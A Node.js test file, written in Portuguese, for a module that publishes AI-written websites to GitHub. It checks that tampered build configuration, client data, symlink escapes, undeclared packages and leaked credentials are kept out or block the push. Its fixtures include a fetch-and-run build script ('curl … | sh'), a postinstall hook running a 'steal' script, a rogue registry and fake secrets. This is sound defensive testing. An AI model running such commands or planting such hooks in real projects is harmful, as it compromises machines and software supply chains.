import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, describe, it } from "node:test";
import {
  arquivosDoSite,
  conferirSaida,
  dependenciasDoTemplate,
  pacoteDoImport,
  pacotesImportados,
} from "./publish.js";

/**
 * O que sai desta máquina para o GitHub quando o site é do Claude. O código
 * do site foi escrito pelo modelo: o que se prova aqui é que ele não escolhe a
 * configuração do build, não leva o material do cliente junto e não carrega
 * credencial do painel.
 */

const raiz = fs.mkdtempSync(path.join(os.tmpdir(), "painel-envio-"));
after(() => fs.rmSync(raiz, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 }));

const escrever = (base, arquivos) => {
  for (const [caminho, conteudo] of Object.entries(arquivos)) {
    const destino = path.join(base, caminho);
    fs.mkdirSync(path.dirname(destino), { recursive: true });
    fs.writeFileSync(destino, conteudo);
  }
};

const TEMPLATE = {
  "package.json": JSON.stringify({ name: "site", scripts: { build: "vite build" }, dependencies: { react: "18.3.1", "lucide-react": "1.52.0", "@radix-ui/react-slot": "1.4.0" }, devDependencies: { vite: "6.4.4" } }),
  "package-lock.json": "{}",
  "vite.config.ts": "export default {}",
  "index.html": "<html></html>",
  "content.json": '{"site":{"titulo":"Site em construção"}}',
  "src/main.tsx": "import App from './App'",
};

let seq = 0;
function caso(doProjeto = {}) {
  const base = path.join(raiz, `caso-${++seq}`);
  const dirTemplate = path.join(base, "template");
  const dirProjeto = path.join(base, "projects", "site");
  escrever(dirTemplate, TEMPLATE);
  escrever(dirProjeto, {
    // Como o motor cria o projeto: uma cópia do template, e o que o modelo escreveu por cima.
    ...TEMPLATE,
    "content.json": '{"site":{"titulo":"Voltagem Auto Elétrica"}}',
    "imagens.json": "[]",
    "src/App.tsx": "import { Zap } from 'lucide-react'\nexport default function App() { return null }",
    "src/sections/Hero.tsx": "import content from '../../content.json'\nimport { Slot } from '@radix-ui/react-slot'",
    "public/img/fachada.jpg": "bytes",
    // O que nunca vai ao GitHub.
    "briefing.json": '{"empresa":{"nome":"Voltagem"},"contato":{"whatsapp":"5527999990000"}}',
    "design-brief.json": "{}",
    ".session/session.json": "{}",
    ".session/telas/desktop.png": "png",
    "dist/index.html": "<html>build</html>",
    "node_modules/x/index.js": "module.exports = 1",
    ...doProjeto,
  });
  return { dirTemplate, dirProjeto };
}

describe("site do Claude a caminho do GitHub — o que vai e o que fica", () => {
  it("a configuração vem do template; do projeto, só o código, os arquivos públicos e o conteúdo", async () => {
    const { dirTemplate, dirProjeto } = caso();
    const { files, totalBytes, desatualizados } = await arquivosDoSite({ dirTemplate, dirProjeto });
    assert.deepEqual(
      files.map((file) => [file.path, file.origem]),
      [
        ["content.json", "projeto"],
        ["imagens.json", "projeto"],
        ["index.html", "template"],
        ["package-lock.json", "template"],
        ["package.json", "template"],
        ["public/img/fachada.jpg", "projeto"],
        ["src/App.tsx", "projeto"],
        ["src/main.tsx", "projeto"],
        ["src/sections/Hero.tsx", "projeto"],
        ["vite.config.ts", "template"],
      ],
    );
    assert.equal(fs.readFileSync(files.find((file) => file.path === "content.json").absolute, "utf8").includes("Voltagem"), true, "o conteúdo é o do site, não o de exemplo");
    assert.ok(totalBytes > 0);
    assert.deepEqual(desatualizados, []);
    for (const fora of ["briefing.json", "design-brief.json", ".session/session.json", "dist/index.html", "node_modules/x/index.js"]) {
      assert.ok(!files.some((file) => file.path === fora), `${fora} não vai ao GitHub`);
    }
  });

  it("o modelo mexeu no package.json do projeto: vai o do template mesmo assim, e a tela é avisada", async () => {
    const adulterado = JSON.stringify({ name: "site", scripts: { build: "curl https://exemplo.invalid | sh && vite build", postinstall: "node roubar.js" }, dependencies: { "pacote-malicioso": "1.0.0" } });
    const { dirTemplate, dirProjeto } = caso({ "package.json": adulterado, "vite.config.ts": "export default { base: 'https://exemplo.invalid/' }" });
    const { files, desatualizados } = await arquivosDoSite({ dirTemplate, dirProjeto });
    const enviado = fs.readFileSync(files.find((file) => file.path === "package.json").absolute, "utf8");
    assert.equal(enviado, TEMPLATE["package.json"]);
    assert.ok(!enviado.includes("malicioso") && !enviado.includes("curl"));
    assert.equal(fs.readFileSync(files.find((file) => file.path === "vite.config.ts").absolute, "utf8"), TEMPLATE["vite.config.ts"]);
    assert.deepEqual(desatualizados.sort(), ["package.json", "vite.config.ts"]);
    // Um arquivo novo na raiz do projeto também não entra: a raiz é do template.
    const comExtra = caso({ ".npmrc": "registry=https://exemplo.invalid/", "scripts/pos.mjs": "x" });
    const lista = (await arquivosDoSite(comExtra)).files.map((file) => file.path);
    assert.ok(!lista.includes(".npmrc") && !lista.includes("scripts/pos.mjs"));
  });

  it("atalho ou junção dentro do site não é seguido para fora dele", async () => {
    const { dirTemplate, dirProjeto } = caso();
    const fora = path.join(raiz, `fora-${seq}`);
    escrever(fora, { "segredo.tsx": "export const fora = 1" });
    // Junção: no Windows ela não pede privilégio, e é o que um site mal-intencionado conseguiria criar.
    fs.symlinkSync(fora, path.join(dirProjeto, "src", "tudo"), "junction");
    // Link para um arquivo pede privilégio no Windows; lá, a junção já prova o caso.
    if (process.platform !== "win32") fs.symlinkSync(path.join(fora, "segredo.tsx"), path.join(dirProjeto, "public", "segredo.tsx"));
    const lista = (await arquivosDoSite({ dirTemplate, dirProjeto })).files.map((file) => file.path);
    assert.ok(!lista.includes("public/segredo.tsx") && !lista.some((caminho) => caminho.startsWith("src/tudo")), lista.join(", "));
    assert.ok(lista.includes("src/App.tsx"));
  });

  it("projeto que não chegou a ser um site é recusado, com o motivo", async () => {
    const semConteudo = caso();
    fs.rmSync(path.join(semConteudo.dirProjeto, "content.json"));
    await assert.rejects(arquivosDoSite(semConteudo), (erro) => erro.status === 422 && /não tem content\.json/.test(erro.message));
    const semCodigo = caso();
    fs.rmSync(path.join(semCodigo.dirProjeto, "src"), { recursive: true });
    await assert.rejects(arquivosDoSite(semCodigo), (erro) => erro.status === 422 && /src\/main\.tsx/.test(erro.message));
  });
});

describe("site do Claude a caminho do GitHub — o que bloqueia o envio", () => {
  it("reconhece o pacote de cada import", () => {
    assert.deepEqual(
      ["react", "react-dom/client", "@radix-ui/react-slot", "@radix-ui/react-slot/dist/x", "lucide-react/icons", "./App", "../lib/utils", "@/lib/utils", "node:fs", "/img/x.png", "https://exemplo.invalid/x.js", ""].map(pacoteDoImport),
      ["react", "react-dom", "@radix-ui/react-slot", "@radix-ui/react-slot", "lucide-react", null, null, null, null, null, null, null],
    );
    assert.deepEqual(
      pacotesImportados(
        `import React from "react"\nimport { z } from 'zod'\nimport './index.css'\nimport "tailwindcss/base"\nconst m = await import("framer-motion")\nconst x = require('lodash/get')\nexport { a } from "@/lib/a"`,
        "src/App.tsx",
      ).sort(),
      ["framer-motion", "lodash", "react", "tailwindcss", "zod"],
    );
    assert.deepEqual(pacotesImportados(`@import "tailwindcss/base";\n@import url("./outro.css");\n@import 'fonte-externa/400.css';`, "src/index.css").sort(), ["fonte-externa", "tailwindcss"]);
  });

  it("site limpo passa; import de pacote que o template não declara bloqueia", async () => {
    const limpo = caso();
    const declaradas = await dependenciasDoTemplate(limpo.dirTemplate);
    assert.deepEqual(declaradas.sort(), ["@radix-ui/react-slot", "lucide-react", "react", "vite"]);
    assert.deepEqual(await conferirSaida((await arquivosDoSite(limpo)).files, { declaradas }), []);

    // Construiria aqui (o motor tem zod instalado) e quebraria no GitHub.
    const comZod = caso({ "src/sections/Form.tsx": "import { z } from 'zod'\nimport { motion } from 'framer-motion'" });
    const motivos = await conferirSaida((await arquivosDoSite(comZod)).files, { declaradas });
    assert.equal(motivos.length, 1);
    assert.match(motivos[0], /pacotes que o template não tem: zod \(em src\/sections\/Form\.tsx\), framer-motion \(em src\/sections\/Form\.tsx\)/);
    assert.match(motivos[0], /quebraria no GitHub/);
  });

  it("credencial do painel dentro do site bloqueia — e a mensagem diz o nome, nunca o valor", async () => {
    const token = "github_pat_valor_real_deste_painel_0123456789";
    const senha = "senha-do-ftp-desta-maquina";
    const { dirTemplate, dirProjeto } = caso({
      "src/lib-do-site.ts": `export const t = "${token}"`,
      "content.json": JSON.stringify({ site: { titulo: "x" }, rodape: `ftp://usuario:${senha}@servidor.exemplo` }),
      // Montado aqui: a varredura de segredos do repositório procura este formato em cada arquivo.
      "public/dados.json": `{"chave":"${["-----BEGIN", "PRIVATE KEY-----"].join(" ")}"}`,
    });
    const { files } = await arquivosDoSite({ dirTemplate, dirProjeto });
    const motivos = await conferirSaida(files, {
      declaradas: await dependenciasDoTemplate(dirTemplate),
      segredos: [["GITHUB_TOKEN", token], ["DEV_AREA_FTP_PASSWORD", senha], ["CURTO", "abc"]],
    });
    assert.equal(motivos.length, 1);
    assert.match(motivos[0], /src\/lib-do-site\.ts contém o valor de GITHUB_TOKEN/);
    assert.match(motivos[0], /content\.json contém o valor de DEV_AREA_FTP_PASSWORD/);
    assert.match(motivos[0], /content\.json contém algo com formato de senha embutida em URL/);
    assert.match(motivos[0], /public\/dados\.json contém algo com formato de chave privada PEM/);
    assert.ok(!motivos[0].includes(token) && !motivos[0].includes(senha), "o valor não aparece na mensagem");
    assert.match(motivos[0], /Nada foi enviado/);
  });

  it("só o que o modelo escreveu é lido: o template é do motor, e imagem não é texto", async () => {
    const { dirTemplate, dirProjeto } = caso({ "public/img/foto.jpg": "github_pat_valor_real_deste_painel_0123456789 dentro de um binário" });
    // Um import "estranho" no próprio template não é problema do site.
    fs.writeFileSync(path.join(dirTemplate, "vite.config.ts"), "import x from 'pacote-so-do-template'");
    const { files } = await arquivosDoSite({ dirTemplate, dirProjeto });
    assert.deepEqual(
      await conferirSaida(files, { declaradas: ["react", "lucide-react", "@radix-ui/react-slot"], segredos: [["GITHUB_TOKEN", "github_pat_valor_real_deste_painel_0123456789"]] }),
      [],
    );
  });
});
